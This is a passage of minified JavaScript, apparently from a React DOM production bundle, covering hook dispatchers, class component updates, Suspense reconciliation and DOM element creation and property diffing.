i=ss(t),s={lane:i,action:n,hasEagerState:!1,eagerState:null,next:null};if(kv(t))Nv(e,s);else{var r=t.alternate;if(t.lanes===0&&(r===null||r.lanes===0)&&(r=e.lastRenderedReducer,r!==null))try{var a=e.lastRenderedState,o=r(a,n);if(s.hasEagerState=!0,s.eagerState=o,Yn(o,a)){var l=e.interleaved;l===null?(s.next=s,Dp(e)):(s.next=l.next,l.next=s),e.interleaved=s;return}}catch{}finally{}n=hv(t,e,s,i),n!==null&&(s=nn(),qn(n,t,i,s),Dv(n,e,i))}}function kv(t){var e=t.alternate;return t===vt||e!==null&&e===vt}function Nv(t,e){ya=Pl=!0;var n=t.pending;n===null?e.next=e:(e.next=n.next,n.next=e),t.pending=e}function Dv(t,e,n){if(n&4194240){var i=e.lanes;i&=t.pendingLanes,n|=i,e.lanes=n,yp(t,n)}}var Ll={readContext:In,useCallback:jt,useContext:jt,useEffect:jt,useImperativeHandle:jt,useInsertionEffect:jt,useLayoutEffect:jt,useMemo:jt,useReducer:jt,useRef:jt,useState:jt,useDebugValue:jt,useDeferredValue:jt,useTransition:jt,useMutableSource:jt,useSyncExternalStore:jt,useId:jt,unstable_isNewReconciler:!1},Ey={readContext:In,useCallback:function(t,e){return Jn().memoizedState=[t,e===void 0?null:e],t},useContext:In,useEffect:gf,useImperativeHandle:function(t,e,n){return n=n!=null?n.concat([t]):null,nl(4194308,4,Tv.bind(null,e,t),n)},useLayoutEffect:function(t,e){return nl(4194308,4,t,e)},useInsertionEffect:function(t,e){return nl(4,2,t,e)},useMemo:function(t,e){var n=Jn();return e=e===void 0?null:e,t=t(),n.memoizedState=[t,e],t},useReducer:function(t,e,n){var i=Jn();return e=n!==void 0?n(e):e,i.memoizedState=i.baseState=e,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:t,lastRenderedState:e},i.queue=t,t=t.dispatch=wy.bind(null,vt,t),[i.memoizedState,t]},useRef:function(t){var e=Jn();return t={current:t},e.memoizedState=t},useState:mf,useDebugValue:Gp,useDeferredValue:function(t){return Jn().memoizedState=t},useTransition:function(){var t=mf(!1),e=t[0];return t=by.bind(null,t[1]),Jn().memoizedState=t,[e,t]},useMutableSource:function(){},useSyncExternalStore:function(t,e,n){var i=vt,s=Jn();if(mt){if(n===void 0)throw Error(se(407));n=n()}else{if(n=e(),Ft===null)throw Error(se(349));Os&30||_v(i,e,n)}s.memoizedState=n;var r={value:n,getSnapshot:e};return s.queue=r,gf(yv.bind(null,i,r,t),[t]),i.flags|=2048,Ba(9,xv.bind(null,i,r,n,e),void 0,null),n},useId:function(){var t=Jn(),e=Ft.identifierPrefix;if(mt){var n=Si,i=yi;n=(i&~(1<<32-Xn(i)-1)).toString(32)+n,e=":"+e+"R"+n,n=Oa++,0<n&&(e+="H"+n.toString(32)),e+=":"}else n=Sy++,e=":"+e+"r"+n.toString(32)+":";return t.memoizedState=e},unstable_isNewReconciler:!1},Ty={readContext:In,useCallback:Cv,useContext:In,useEffect:Hp,useImperativeHandle:Av,useInsertionEffect:Mv,useLayoutEffect:Ev,useMemo:Rv,useReducer:Nc,useRef:wv,useState:function(){return Nc(Fa)},useDebugValue:Gp,useDeferredValue:function(t){var e=Un();return Pv(e,Pt.memoizedState,t)},useTransition:function(){var t=Nc(Fa)[0],e=Un().memoizedState;return[t,e]},useMutableSource:gv,useSyncExternalStore:vv,useId:Lv,unstable_isNewReconciler:!1},Ay={readContext:In,useCallback:Cv,useContext:In,useEffect:Hp,useImperativeHandle:Av,useInsertionEffect:Mv,useLayoutEffect:Ev,useMemo:Rv,useReducer:Dc,useRef:wv,useState:function(){return Dc(Fa)},useDebugValue:Gp,useDeferredValue:function(t){var e=Un();return Pt===null?e.memoizedState=t:Pv(e,Pt.memoizedState,t)},useTransition:function(){var t=Dc(Fa)[0],e=Un().memoizedState;return[t,e]},useMutableSource:gv,useSyncExternalStore:vv,useId:Lv,unstable_isNewReconciler:!1};function Vn(t,e){if(t&&t.defaultProps){e=xt({},e),t=t.defaultProps;for(var n in t)e[n]===void 0&&(e[n]=t[n]);return e}return e}function $u(t,e,n,i){e=t.memoizedState,n=n(i,e),n=n==null?e:xt({},e,n),t.memoizedState=n,t.lanes===0&&(t.updateQueue.baseState=n)}var Zl={isMounted:function(t){return(t=t._reactInternals)?Hs(t)===t:!1},enqueueSetState:function(t,e,n){t=t._reactInternals;var i=nn(),s=ss(t),r=Mi(i,s);r.payload=e,n!=null&&(r.callback=n),e=ns(t,r,s),e!==null&&(qn(e,t,s,i),el(e,t,s))},enqueueReplaceState:function(t,e,n){t=t._reactInternals;var i=nn(),s=ss(t),r=Mi(i,s);r.tag=1,r.payload=e,n!=null&&(r.callback=n),e=ns(t,r,s),e!==null&&(qn(e,t,s,i),el(e,t,s))},enqueueForceUpdate:function(t,e){t=t._reactInternals;var n=nn(),i=ss(t),s=Mi(n,i);s.tag=2,e!=null&&(s.callback=e),e=ns(t,s,i),e!==null&&(qn(e,t,i,n),el(e,t,i))}};function vf(t,e,n,i,s,r,a){return t=t.stateNode,typeof t.shouldComponentUpdate=="function"?t.shouldComponentUpdate(i,r,a):e.prototype&&e.prototype.isPureReactComponent?!La(n,i)||!La(s,r):!0}function Iv(t,e,n){var i=!1,s=ls,r=e.contextType;return typeof r=="object"&&r!==null?r=In(r):(s=hn(e)?Is:Jt.current,i=e.contextTypes,r=(i=i!=null)?Cr(t,s):ls),e=new e(n,r),t.memoizedState=e.state!==null&&e.state!==void 0?e.state:null,e.updater=Zl,t.stateNode=e,e._reactInternals=t,i&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=s,t.__reactInternalMemoizedMaskedChildContext=r),e}function _f(t,e,n,i){t=e.state,typeof e.componentWillReceiveProps=="function"&&e.componentWillReceiveProps(n,i),typeof e.UNSAFE_componentWillReceiveProps=="function"&&e.UNSAFE_componentWillReceiveProps(n,i),e.state!==t&&Zl.enqueueReplaceState(e,e.state,null)}function Ku(t,e,n,i){var s=t.stateNode;s.props=n,s.state=t.memoizedState,s.refs={},Ip(t);var r=e.contextType;typeof r=="object"&&r!==null?s.context=In(r):(r=hn(e)?Is:Jt.current,s.context=Cr(t,r)),s.state=t.memoizedState,r=e.getDerivedStateFromProps,typeof r=="function"&&($u(t,e,r,n),s.state=t.memoizedState),typeof e.getDerivedStateFromProps=="function"||typeof s.getSnapshotBeforeUpdate=="function"||typeof s.UNSAFE_componentWillMount!="function"&&typeof s.componentWillMount!="function"||(e=s.state,typeof s.componentWillMount=="function"&&s.componentWillMount(),typeof s.UNSAFE_componentWillMount=="function"&&s.UNSAFE_componentWillMount(),e!==s.state&&Zl.enqueueReplaceState(s,s.state,null),Cl(t,n,s,i),s.state=t.memoizedState),typeof s.componentDidMount=="function"&&(t.flags|=4194308)}function kr(t,e){try{var n="",i=e;do n+=tx(i),i=i.return;while(i);var s=n}catch(r){s=`
Error generating stack: `+r.message+`
`+r.stack}return{value:t,source:e,stack:s,digest:null}}function Ic(t,e,n){return{value:t,source:null,stack:n??null,digest:e??null}}function Zu(t,e){try{console.error(e.value)}catch(n){setTimeout(function(){throw n})}}var Cy=typeof WeakMap=="function"?WeakMap:Map;function Uv(t,e,n){n=Mi(-1,n),n.tag=3,n.payload={element:null};var i=e.value;return n.callback=function(){Nl||(Nl=!0,od=i),Zu(t,e)},n}function Ov(t,e,n){n=Mi(-1,n),n.tag=3;var i=t.type.getDerivedStateFromError;if(typeof i=="function"){var s=e.value;n.payload=function(){return i(s)},n.callback=function(){Zu(t,e)}}var r=t.stateNode;return r!==null&&typeof r.componentDidCatch=="function"&&(n.callback=function(){Zu(t,e),typeof i!="function"&&(is===null?is=new Set([this]):is.add(this));var a=e.stack;this.componentDidCatch(e.value,{componentStack:a!==null?a:""})}),n}function xf(t,e,n){var i=t.pingCache;if(i===null){i=t.pingCache=new Cy;var s=new Set;i.set(e,s)}else s=i.get(e),s===void 0&&(s=new Set,i.set(e,s));s.has(n)||(s.add(n),t=Hy.bind(null,t,e,n),e.then(t,t))}function yf(t){do{var e;if((e=t.tag===13)&&(e=t.memoizedState,e=e!==null?e.dehydrated!==null:!0),e)return t;t=t.return}while(t!==null);return null}function Sf(t,e,n,i,s){return t.mode&1?(t.flags|=65536,t.lanes=s,t):(t===e?t.flags|=65536:(t.flags|=128,n.flags|=131072,n.flags&=-52805,n.tag===1&&(n.alternate===null?n.tag=17:(e=Mi(-1,1),e.tag=2,ns(n,e,1))),n.lanes|=1),t)}var Ry=Ni.ReactCurrentOwner,dn=!1;function tn(t,e,n,i){e.child=t===null?pv(e,null,n,i):Pr(e,t.child,n,i)}function bf(t,e,n,i,s){n=n.render;var r=e.ref;return wr(e,s),i=zp(t,e,n,i,r,s),n=Vp(),t!==null&&!dn?(e.updateQueue=t.updateQueue,e.flags&=-2053,t.lanes&=~s,Pi(t,e,s)):(mt&&n&&Cp(e),e.flags|=1,tn(t,e,i,s),e.child)}function wf(t,e,n,i,s){if(t===null){var r=n.type;return typeof r=="function"&&!Zp(r)&&r.defaultProps===void 0&&n.compare===null&&n.defaultProps===void 0?(e.tag=15,e.type=r,Fv(t,e,r,i,s)):(t=al(n.type,null,i,e,e.mode,s),t.ref=e.ref,t.return=e,e.child=t)}if(r=t.child,!(t.lanes&s)){var a=r.memoizedProps;if(n=n.compare,n=n!==null?n:La,n(a,i)&&t.ref===e.ref)return Pi(t,e,s)}return e.flags|=1,t=rs(r,i),t.ref=e.ref,t.return=e,e.child=t}function Fv(t,e,n,i,s){if(t!==null){var r=t.memoizedProps;if(La(r,i)&&t.ref===e.ref)if(dn=!1,e.pendingProps=i=r,(t.lanes&s)!==0)t.flags&131072&&(dn=!0);else return e.lanes=t.lanes,Pi(t,e,s)}return Ju(t,e,n,i,s)}function Bv(t,e,n){var i=e.pendingProps,s=i.children,r=t!==null?t.memoizedState:null;if(i.mode==="hidden")if(!(e.mode&1))e.memoizedState={baseLanes:0,cachePool:null,transitions:null},dt(_r,yn),yn|=n;else{if(!(n&1073741824))return t=r!==null?r.baseLanes|n:n,e.lanes=e.childLanes=1073741824,e.memoizedState={baseLanes:t,cachePool:null,transitions:null},e.updateQueue=null,dt(_r,yn),yn|=t,null;e.memoizedState={baseLanes:0,cachePool:null,transitions:null},i=r!==null?r.baseLanes:n,dt(_r,yn),yn|=i}else r!==null?(i=r.baseLanes|n,e.memoizedState=null):i=n,dt(_r,yn),yn|=i;return tn(t,e,s,n),e.child}function zv(t,e){var n=e.ref;(t===null&&n!==null||t!==null&&t.ref!==n)&&(e.flags|=512,e.flags|=2097152)}function Ju(t,e,n,i,s){var r=hn(n)?Is:Jt.current;return r=Cr(e,r),wr(e,s),n=zp(t,e,n,i,r,s),i=Vp(),t!==null&&!dn?(e.updateQueue=t.updateQueue,e.flags&=-2053,t.lanes&=~s,Pi(t,e,s)):(mt&&i&&Cp(e),e.flags|=1,tn(t,e,n,s),e.child)}function Mf(t,e,n,i,s){if(hn(n)){var r=!0;wl(e)}else r=!1;if(wr(e,s),e.stateNode===null)il(t,e),Iv(e,n,i),Ku(e,n,i,s),i=!0;else if(t===null){var a=e.stateNode,o=e.memoizedProps;a.props=o;var l=a.context,c=n.contextType;typeof c=="object"&&c!==null?c=In(c):(c=hn(n)?Is:Jt.current,c=Cr(e,c));var d=n.getDerivedStateFromProps,p=typeof d=="function"||typeof a.getSnapshotBeforeUpdate=="function";p||typeof a.UNSAFE_componentWillReceiveProps!="function"&&typeof a.componentWillReceiveProps!="function"||(o!==i||l!==c)&&_f(e,a,i,c),Wi=!1;var h=e.memoizedState;a.state=h,Cl(e,i,a,s),l=e.memoizedState,o!==i||h!==l||pn.current||Wi?(typeof d=="function"&&($u(e,n,d,i),l=e.memoizedState),(o=Wi||vf(e,n,o,i,h,l,c))?(p||typeof a.UNSAFE_componentWillMount!="function"&&typeof a.componentWillMount!="function"||(typeof a.componentWillMount=="function"&&a.componentWillMount(),typeof a.UNSAFE_componentWillMount=="function"&&a.UNSAFE_componentWillMount()),typeof a.componentDidMount=="function"&&(e.flags|=4194308)):(typeof a.componentDidMount=="function"&&(e.flags|=4194308),e.memoizedProps=i,e.memoizedState=l),a.props=i,a.state=l,a.context=c,i=o):(typeof a.componentDidMount=="function"&&(e.flags|=4194308),i=!1)}else{a=e.stateNode,fv(t,e),o=e.memoizedProps,c=e.type===e.elementType?o:Vn(e.type,o),a.props=c,p=e.pendingProps,h=a.context,l=n.contextType,typeof l=="object"&&l!==null?l=In(l):(l=hn(n)?Is:Jt.current,l=Cr(e,l));var f=n.getDerivedStateFromProps;(d=typeof f=="function"||typeof a.getSnapshotBeforeUpdate=="function")||typeof a.UNSAFE_componentWillReceiveProps!="function"&&typeof a.componentWillReceiveProps!="function"||(o!==p||h!==l)&&_f(e,a,i,l),Wi=!1,h=e.memoizedState,a.state=h,Cl(e,i,a,s);var _=e.memoizedState;o!==p||h!==_||pn.current||Wi?(typeof f=="function"&&($u(e,n,f,i),_=e.memoizedState),(c=Wi||vf(e,n,c,i,h,_,l)||!1)?(d||typeof a.UNSAFE_componentWillUpdate!="function"&&typeof a.componentWillUpdate!="function"||(typeof a.componentWillUpdate=="function"&&a.componentWillUpdate(i,_,l),typeof a.UNSAFE_componentWillUpdate=="function"&&a.UNSAFE_componentWillUpdate(i,_,l)),typeof a.componentDidUpdate=="function"&&(e.flags|=4),typeof a.getSnapshotBeforeUpdate=="function"&&(e.flags|=1024)):(typeof a.componentDidUpdate!="function"||o===t.memoizedProps&&h===t.memoizedState||(e.flags|=4),typeof a.getSnapshotBeforeUpdate!="function"||o===t.memoizedProps&&h===t.memoizedState||(e.flags|=1024),e.memoizedProps=i,e.memoizedState=_),a.props=i,a.state=_,a.context=l,i=c):(typeof a.componentDidUpdate!="function"||o===t.memoizedProps&&h===t.memoizedState||(e.flags|=4),typeof a.getSnapshotBeforeUpdate!="function"||o===t.memoizedProps&&h===t.memoizedState||(e.flags|=1024),i=!1)}return Qu(t,e,n,i,r,s)}function Qu(t,e,n,i,s,r){zv(t,e);var a=(e.flags&128)!==0;if(!i&&!a)return s&&cf(e,n,!1),Pi(t,e,r);i=e.stateNode,Ry.current=e;var o=a&&typeof n.getDerivedStateFromError!="function"?null:i.render();return e.flags|=1,t!==null&&a?(e.child=Pr(e,t.child,null,r),e.child=Pr(e,null,o,r)):tn(t,e,o,r),e.memoizedState=i.state,s&&cf(e,n,!0),e.child}function Vv(t){var e=t.stateNode;e.pendingContext?lf(t,e.pendingContext,e.pendingContext!==e.context):e.context&&lf(t,e.context,!1),Up(t,e.containerInfo)}function Ef(t,e,n,i,s){return Rr(),Pp(s),e.flags|=256,tn(t,e,n,i),e.child}var ed={dehydrated:null,treeContext:null,retryLane:0};function td(t){return{baseLanes:t,cachePool:null,transitions:null}}function Hv(t,e,n){var i=e.pendingProps,s=gt.current,r=!1,a=(e.flags&128)!==0,o;if((o=a)||(o=t!==null&&t.memoizedState===null?!1:(s&2)!==0),o?(r=!0,e.flags&=-129):(t===null||t.memoizedState!==null)&&(s|=1),dt(gt,s&1),t===null)return qu(e),t=e.memoizedState,t!==null&&(t=t.dehydrated,t!==null)?(e.mode&1?t.data==="$!"?e.lanes=8:e.lanes=1073741824:e.lanes=1,null):(a=i.children,t=i.fallback,r?(i=e.mode,r=e.child,a={mode:"hidden",children:a},!(i&1)&&r!==null?(r.childLanes=0,r.pendingProps=a):r=ec(a,i,0,null),t=Ds(t,i,n,null),r.return=e,t.return=e,r.sibling=t,e.child=r,e.child.memoizedState=td(n),e.memoizedState=ed,t):Wp(e,a));if(s=t.memoizedState,s!==null&&(o=s.dehydrated,o!==null))return Py(t,e,a,i,o,s,n);if(r){r=i.fallback,a=e.mode,s=t.child,o=s.sibling;var l={mode:"hidden",children:i.children};return!(a&1)&&e.child!==s?(i=e.child,i.childLanes=0,i.pendingProps=l,e.deletions=null):(i=rs(s,l),i.subtreeFlags=s.subtreeFlags&14680064),o!==null?r=rs(o,r):(r=Ds(r,a,n,null),r.flags|=2),r.return=e,i.return=e,i.sibling=r,e.child=i,i=r,r=e.child,a=t.child.memoizedState,a=a===null?td(n):{baseLanes:a.baseLanes|n,cachePool:null,transitions:a.transitions},r.memoizedState=a,r.childLanes=t.childLanes&~n,e.memoizedState=ed,i}return r=t.child,t=r.sibling,i=rs(r,{mode:"visible",children:i.children}),!(e.mode&1)&&(i.lanes=n),i.return=e,i.sibling=null,t!==null&&(n=e.deletions,n===null?(e.deletions=[t],e.flags|=16):n.push(t)),e.child=i,e.memoizedState=null,i}function Wp(t,e){return e=ec({mode:"visible",children:e},t.mode,0,null),e.return=t,t.child=e}function wo(t,e,n,i){return i!==null&&Pp(i),Pr(e,t.child,null,n),t=Wp(e,e.pendingProps.children),t.flags|=2,e.memoizedState=null,t}function Py(t,e,n,i,s,r,a){if(n)return e.flags&256?(e.flags&=-257,i=Ic(Error(se(422))),wo(t,e,a,i)):e.memoizedState!==null?(e.child=t.child,e.flags|=128,null):(r=i.fallback,s=e.mode,i=ec({mode:"visible",children:i.children},s,0,null),r=Ds(r,s,a,null),r.flags|=2,i.return=e,r.return=e,i.sibling=r,e.child=i,e.mode&1&&Pr(e,t.child,null,a),e.child.memoizedState=td(a),e.memoizedState=ed,r);if(!(e.mode&1))return wo(t,e,a,null);if(s.data==="$!"){if(i=s.nextSibling&&s.nextSibling.dataset,i)var o=i.dgst;return i=o,r=Error(se(419)),i=Ic(r,i,void 0),wo(t,e,a,i)}if(o=(a&t.childLanes)!==0,dn||o){if(i=Ft,i!==null){switch(a&-a){case 4:s=2;break;case 16:s=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:s=32;break;case 536870912:s=268435456;break;default:s=0}s=s&(i.suspendedLanes|a)?0:s,s!==0&&s!==r.retryLane&&(r.retryLane=s,Ri(t,s),qn(i,t,s,-1))}return Kp(),i=Ic(Error(se(421))),wo(t,e,a,i)}return s.data==="$?"?(e.flags|=128,e.child=t.child,e=Gy.bind(null,t),s._reactRetry=e,null):(t=r.treeContext,bn=ts(s.nextSibling),wn=e,mt=!0,Gn=null,t!==null&&(Ln[kn++]=yi,Ln[kn++]=Si,Ln[kn++]=Us,yi=t.id,Si=t.overflow,Us=e),e=Wp(e,i.children),e.flags|=4096,e)}function Tf(t,e,n){t.lanes|=e;var i=t.alternate;i!==null&&(i.lanes|=e),Yu(t.return,e,n)}function Uc(t,e,n,i,s){var r=t.memoizedState;r===null?t.memoizedState={isBackwards:e,rendering:null,renderingStartTime:0,last:i,tail:n,tailMode:s}:(r.isBackwards=e,r.rendering=null,r.renderingStartTime=0,r.last=i,r.tail=n,r.tailMode=s)}function Gv(t,e,n){var i=e.pendingProps,s=i.revealOrder,r=i.tail;if(tn(t,e,i.children,n),i=gt.current,i&2)i=i&1|2,e.flags|=128;else{if(t!==null&&t.flags&128)e:for(t=e.child;t!==null;){if(t.tag===13)t.memoizedState!==null&&Tf(t,n,e);else if(t.tag===19)Tf(t,n,e);else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break e;for(;t.sibling===null;){if(t.return===null||t.return===e)break e;t=t.return}t.sibling.return=t.return,t=t.sibling}i&=1}if(dt(gt,i),!(e.mode&1))e.memoizedState=null;else switch(s){case"forwards":for(n=e.child,s=null;n!==null;)t=n.alternate,t!==null&&Rl(t)===null&&(s=n),n=n.sibling;n=s,n===null?(s=e.child,e.child=null):(s=n.sibling,n.sibling=null),Uc(e,!1,s,n,r);break;case"backwards":for(n=null,s=e.child,e.child=null;s!==null;){if(t=s.alternate,t!==null&&Rl(t)===null){e.child=s;break}t=s.sibling,s.sibling=n,n=s,s=t}Uc(e,!0,n,null,r);break;case"together":Uc(e,!1,null,null,void 0);break;default:e.memoizedState=null}return e.child}function il(t,e){!(e.mode&1)&&t!==null&&(t.alternate=null,e.alternate=null,e.flags|=2)}function Pi(t,e,n){if(t!==null&&(e.dependencies=t.dependencies),Fs|=e.lanes,!(n&e.childLanes))return null;if(t!==null&&e.child!==t.child)throw Error(se(153));if(e.child!==null){for(t=e.child,n=rs(t,t.pendingProps),e.child=n,n.return=e;t.sibling!==null;)t=t.sibling,n=n.sibling=rs(t,t.pendingProps),n.return=e;n.sibling=null}return e.child}function Ly(t,e,n){switch(e.tag){case 3:Vv(e),Rr();break;case 5:mv(e);break;case 1:hn(e.type)&&wl(e);break;case 4:Up(e,e.stateNode.containerInfo);break;case 10:var i=e.type._context,s=e.memoizedProps.value;dt(Tl,i._currentValue),i._currentValue=s;break;case 13:if(i=e.memoizedState,i!==null)return i.dehydrated!==null?(dt(gt,gt.current&1),e.flags|=128,null):n&e.child.childLanes?Hv(t,e,n):(dt(gt,gt.current&1),t=Pi(t,e,n),t!==null?t.sibling:null);dt(gt,gt.current&1);break;case 19:if(i=(n&e.childLanes)!==0,t.flags&128){if(i)return Gv(t,e,n);e.flags|=128}if(s=e.memoizedState,s!==null&&(s.rendering=null,s.tail=null,s.lastEffect=null),dt(gt,gt.current),i)break;return null;case 22:case 23:return e.lanes=0,Bv(t,e,n)}return Pi(t,e,n)}var Wv,nd,jv,Xv;Wv=function(t,e){for(var n=e.child;n!==null;){if(n.tag===5||n.tag===6)t.appendChild(n.stateNode);else if(n.tag!==4&&n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return;n=n.return}n.sibling.return=n.return,n=n.sibling}};nd=function(){};jv=function(t,e,n,i){var s=t.memoizedProps;if(s!==i){t=e.stateNode,Rs(si.current);var r=null;switch(n){case"input":s=Mu(t,s),i=Mu(t,i),r=[];break;case"select":s=xt({},s,{value:void 0}),i=xt({},i,{value:void 0}),r=[];break;case"textarea":s=Au(t,s),i=Au(t,i),r=[];break;default:typeof s.onClick!="function"&&typeof i.onClick=="function"&&(t.onclick=Sl)}Ru(n,i);var a;n=null;for(c in s)if(!i.hasOwnProperty(c)&&s.hasOwnProperty(c)&&s[c]!=null)if(c==="style"){var o=s[c];for(a in o)o.hasOwnProperty(a)&&(n||(n={}),n[a]="")}else c!=="dangerouslySetInnerHTML"&&c!=="children"&&c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&c!=="autoFocus"&&(Ma.hasOwnProperty(c)?r||(r=[]):(r=r||[]).push(c,null));for(c in i){var l=i[c];if(o=s!=null?s[c]:void 0,i.hasOwnProperty(c)&&l!==o&&(l!=null||o!=null))if(c==="style")if(o){for(a in o)!o.hasOwnProperty(a)||l&&l.hasOwnProperty(a)||(n||(n={}),n[a]="");for(a in l)l.hasOwnProperty(a)&&o[a]!==l[a]&&(n||(n={}),n[a]=l[a])}else n||(r||(r=[]),r.push(c,n)),n=l;else c==="dangerouslySetInnerHTML"?(l=l?l.__html:void 0,o=o?o.__html:void 0,l!=null&&o!==l&&(r=r||[]).push(c,l)):c==="children"?typeof l!="string"&&typeof l!="number"||(r=r||[]).push(c,""+l):c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&(Ma.hasOwnProperty(c)?(l!=null&&c==="onScroll"&&ht("scroll",t),r||o===l||(r=[])):(r=r||[]).push(c,l))}n&&(r=r||[]).push("style",n);var c=r;(e.updateQueue=c)&&(e.flags|=4)}};Xv=function(t,e,n,i){n!==i&&(e.flags|=4)};function Qr(t,e){if(!mt)switch(t.tailMode){case"hidden":e=t.tail;for(var n=null;e!==null;)e.alternate!==null&&(n=e),e=e.sibling;n===null?t.tail=null:n.sibling=null;break;case"collapsed":n=t.tail;for(var i=null;n!==null;)n.alternate!==null&&(i=n),n=n.sibling;i===null?e||t.tail===null?t.tail=null:t.tail.sibling=null:i.sibling=null}}function Xt(t){var e=t.alternate!==null&&t.alternate.child===t.child,n=0,i=0;if(e)for(var s=t.child;s!==null;)n|=s.lanes|s.childLanes,i|=s.subtreeFlags&14680064,i|=s.flags&14680064,s.return=t,s=s.sibling;else for(s=t.child;s!==null;)n|=s.lanes|s.childLanes,i|=s.subtreeFlags,i|=s.flags,s.return=t,s=s.sibling;return t.subtreeFlags|=i,t.childLanes=n,e}function ky(t,e,n){var i=e.pendingProps;switch(Rp(e),e.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return Xt(e),null;case 1:return hn(e.type)&&bl(),Xt(e),null;case 3:return i=e.stateNode,Lr(),ft(pn),ft(Jt),Fp(),i.pendingContext&&(i.context=i.pendingContext,i.pendingContext=null),(t===null||t.child===null)&&(So(e)?e.flags|=4:t===null||t.memoizedState.isDehydrated&&!(e.flags&256)||(e.flags|=1024,Gn!==null&&(ud(Gn),Gn=null))),nd(t,e),Xt(e),null;case 5:Op(e);var s=Rs(Ua.current);if(n=e.type,t!==null&&e.stateNode!=null)jv(t,e,n,i,s),t.ref!==e.ref&&(e.flags|=512,e.flags|=2097152);else{if(!i){if(e.stateNode===null)throw Error(se(166));return Xt(e),null}if(t=Rs(si.current),So(e)){i=e.stateNode,n=e.type;var r=e.memoizedProps;switch(i[ei]=e,i[Da]=r,t=(e.mode&1)!==0,n){case"dialog":ht("cancel",i),ht("close",i);break;case"iframe":case"object":case"embed":ht("load",i);break;case"video":case"audio":for(s=0;s<pa.length;s++)ht(pa[s],i);break;case"source":ht("error",i);break;case"img":case"image":case"link":ht("error",i),ht("load",i);break;case"details":ht("toggle",i);break;case"input":Dh(i,r),ht("invalid",i);break;case"select":i._wrapperState={wasMultiple:!!r.multiple},ht("invalid",i);break;case"textarea":Uh(i,r),ht("invalid",i)}Ru(n,r),s=null;for(var a in r)if(r.hasOwnProperty(a)){var o=r[a];a==="children"?typeof o=="string"?i.textContent!==o&&(r.suppressHydrationWarning!==!0&&yo(i.textContent,o,t),s=["children",o]):typeof o=="number"&&i.textContent!==""+o&&(r.suppressHydrationWarning!==!0&&yo(i.textContent,o,t),s=["children",""+o]):Ma.hasOwnProperty(a)&&o!=null&&a==="onScroll"&&ht("scroll",i)}switch(n){case"input":po(i),Ih(i,r,!0);break;case"textarea":po(i),Oh(i);break;case"select":case"option":break;default:typeof r.onClick=="function"&&(i.onclick=Sl)}i=s,e.updateQueue=i,i!==null&&(e.flags|=4)}else{a=s.nodeType===9?s:s.ownerDocument,t==="http://www.w3.org/1999/xhtml"&&(t=yg(n)),t==="http://www.w3.org/1999/xhtml"?n==="script"?(t=a.createElement("div"),t.innerHTML="<script><\/script>",t=t.removeChild(t.firstChild)):typeof i.is=="string"?t=a.createElement(n,{is:i.is}):(t=a.createElement(n),n==="select"&&(a=t,i.multiple?a.multiple=!0:i.size&&(a.size=i.size))):t=a.createElementNS(t,n),t[ei]=e,t[Da]=i,Wv(t,e,!1,!1),e.stateNode=t;e:{switch(a=Pu(n,i),n){case"dialog":ht("cancel",t),ht("close",t),s=i;break;case"iframe":case"object":case"embed":ht("load",t),s=i;break;case"video":case"audio":for(s=0;s<pa.length;s++)ht(pa[s],t);s=i;break;case"source":ht("error",t),s=i;break;case"img":case"image":case"link":ht("error",t),ht("load",t),s=i;break;case"details":ht("toggle",t),s=i;break;case"input":Dh(t,i),s=Mu(t,i),ht("invalid",t);break;case"option":s=i;break;case"select":t._wrapperState={wasMultiple:!!i.multiple},s=xt({},i,{value:void 0}),ht("invalid",t);break;case"textarea":Uh(t,i),s=Au(t,i),ht("invalid",t);break;default:s=i}Ru(n,s),o=s;for(r in o)if(o.hasOwnProperty(r)){var l=o[r];r==="style"?wg(t,l):r==="dangerouslySetInnerHTML"?(l=l?l.__html:void 0,l!=null&&Sg(t,l)):r==="children"?typeof l=="string"?(n!=="textarea"||l!=="")&&Ea(t,l):typeof l=="number"&&Ea(t,""+l):r!=="suppressContentEditableWarning"&&r!=="suppressHydrationWarning"&&r!=="autoFocus"&&(Ma.hasOwnProperty(r)?l!=null&&r==="onScroll"&&ht("scroll",t):l!=null&&fp(t,r,l,a))}switch(n){case"input":po(t),Ih(t,i,!1);break;case"textarea":po(t),Oh(t);break;case"option":i.value!=null&&t.setAttribute("value",""+os(i.value));break;case"select":t.multiple=!!i.multiple,r=i.value,r!=null?xr(t,!!i.multiple,r,!1):i.defaultValue!=null&&xr(t,!!i.multiple,i.defaultValue,!0);break;default:typeof s.onClick=="function"&&(t.onclick=Sl)}switch(n){case"button":case"input":case"select":case"textarea":i=!!i.autoFocus;break e;case"img":i=!0;break e;default:i=!1}}i&&(e.flags|=4)}e.ref!==null&&(e.flags|=512,e.flags|=2097152)}return Xt(e),null;case 6:if(t&&e.stateNode!=null)Xv(t,e,t.memoizedProps,i);else{if(typeof i!="string"&&e.stateNode===null)throw Error(se(166));if(n=Rs(Ua.current),Rs(si.current),So(e)){if(i=e.stateNode,n=e.memoizedProps,i[ei]=e,(r=i.nodeValue!==n)&&(t=wn,t!==null))switch(t.tag){case 3:yo(i.nodeValue,n,(t.mode&1)!==0);break;case 5:t.memoizedProps.suppressHydrationWarning!==!0&&yo(i.nodeValue,n,(t.mode&1)!==0)}r&&(e.flags|=4)}else i=(n.nodeType===9?n:n.ownerDocument).createTextNode(i),i[ei]=e,e.stateNode=i}return Xt(e),null;case 13:if(ft(gt),i=e.memoizedState,t===null||t.memoizedState!==null&&t.memoizedState.dehydrated!==null){if(mt&&bn!==null&&e.mode&1&&!(e.flags&128))uv(),Rr(),e.flags|=98560,r=!1;else if(r=So(e),i!==null&&i.dehydrated!==null){if(t===null){if(!r)throw Error(se(318));if(r=e.memoizedState,r=r!==null?r.dehydrated:null,!r)throw Error(se(317));r[ei]=e}else Rr(),!(e.flags&128)&&(e.memoizedState=null),e.flags|=4;Xt(e),r=!1}else Gn!==null&&(ud(Gn),Gn=null),r=!0;if(!r)return e.flags&65536?e:null}return 